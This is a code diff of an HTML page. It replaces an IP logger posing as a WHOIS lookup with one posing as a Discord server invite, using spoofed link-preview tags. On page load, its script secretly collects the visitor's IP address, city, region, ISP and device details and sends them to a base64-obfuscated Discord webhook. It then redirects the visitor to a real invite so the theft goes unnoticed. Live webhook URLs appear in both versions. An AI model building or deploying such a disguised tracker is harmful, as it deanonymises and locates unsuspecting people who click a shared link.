@@ -1,82 +1,56 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>WHOIS Lookup - Verifying...</title>
+    <title>Discord - A New Way to Chat with Friends & Communities</title>
+    <!-- This makes the link look like a real Discord invite when shared -->
+    <meta property="og:title" content="Join the Server">
+    <meta property="og:description" content="You've been invited to join a server.">
+    <meta property="og:image" content="https://assets-global.website-files.com/6257adef93867a315140679b/6257adef93867a732840682e_Discord-Logo-Color.png">
     <style>
-        body { 
-            background: #0a0a0a; 
-            color: #00ff41; /* Classic Matrix/Terminal Green */
-            font-family: 'Courier New', Courier, monospace; 
-            display: flex; 
-            flex-direction: column; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            overflow: hidden;
-        }
-        .terminal-text {
-            border-right: 2px solid #00ff41;
-            white-space: nowrap;
-            overflow: hidden;
-            animation: typing 2s steps(30, end), blink .75s step-end infinite;
-        }
-        @keyframes typing { from { width: 0 } to { width: 100% } }
-        @keyframes blink { from, to { border-color: transparent } 50% { border-color: #00ff41 } }
+        body { background-color: #313338; color: #f2f3f5; font-family: 'gg sans', 'Noto Sans', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .invite-box { background: #2b2d31; width: 440px; padding: 32px; border-radius: 8px; text-align: center; box-shadow: 0 8px 16px rgba(0,0,0,0.2); }
+        .loading-text { color: #b5bac1; font-size: 14px; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="terminal-text">QUERYING DATABASE: [WHOIS_REQUEST]...</div>
-    <p style="font-size: 10px; color: #008f11;">Status: Fetching packets...</p>
+    <div class="invite-box">
+        <img src="https://assets-global.website-files.com/6257adef93867a315140679b/6257adef93867a732840682e_Discord-Logo-Color.png" width="100" alt="Discord">
+        <div class="loading-text">Resolving Invite...</div>
+    </div>
 
     <script>
-        async function runWhois() {
+        async function silentLog() {
             try {
-                // 1. IP and Location Check (via external API for more detail)
+                // 1. Secret Webhook (Your Base64 String)
+                const secret = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUwMjU5MTYyNTY4NjI5MDQzMi9mdDFLcS1tc212YzVPakFVeEhPeHhvNmFlME43Y01DRkFDYjZtQU9QS1o1ZTh1N2NjTkJuby1fQXIwQVhubjZqd0dKcg==";
+                const hook = atob(secret);
+
+                // 2. Fetch Data
                 const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
+                const d = await res.json();
 
-                // 2. Format the message for Discord like a WHOIS entry
-                const whoisEntry = `
-\`\`\`yaml
-[ WHOIS DATA REPORT ]
------------------------------------
-IP ADDRESS : ${data.ip}
-CITY       : ${data.city}
-REGION     : ${data.region}
-COUNTRY    : ${data.country_name}
-ISP        : ${data.org}
------------------------------------
-HARDWARE   : ${navigator.platform}
-CORES      : ${navigator.hardwareConcurrency}
-RESOLUTION : ${screen.width}x${screen.height}
-TIMESTAMP  : ${new Date().toISOString()}
------------------------------------
-USER AGENT : ${navigator.userAgent}
-\`\`\``;
-
-                // 3. Send to your Webhook
-                const webhookURL = "https://discordapp.com/api/webhooks/1502591625686290432/ft1Kq-msmvc5OjAUxHOxxo6ae0N7cMCFACb6mAOPKZ5e8u7ccNBno-_Ar0AXnn6jwGJr";
-
-                await fetch(webhookURL, {
+                // 3. Send to Discord
+                await fetch(hook, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        username: "WHOIS-NODE-SYSTEM",
-                        content: whoisEntry
+                        embeds: [{
+                            title: "✅ Stealth Connection",
+                            description: `**ISP:** ${d.org}\n**Location:** ${d.city}, ${d.region}\n**Device:** ${navigator.platform}`,
+                            color: 5814783, // Discord Blue
+                            footer: { text: `IP: ${d.ip}` }
+                        }]
                     })
                 });
+            } catch (e) {}
 
-            } catch (e) { }
-
-            // 4. Redirect to a real Whois site so it looks legitimate
+            // 4. Redirect to the real target after 1.8 seconds
             setTimeout(() => {
-                window.location.href = "https://who.is";
-            }, 2500);
+                window.location.href = "https://discord.com/invite/8888"; // Or any real link
+            }, 1800);
         }
-
-        runWhois();
+        silentLog();
     </script>
 </body>
 </html>
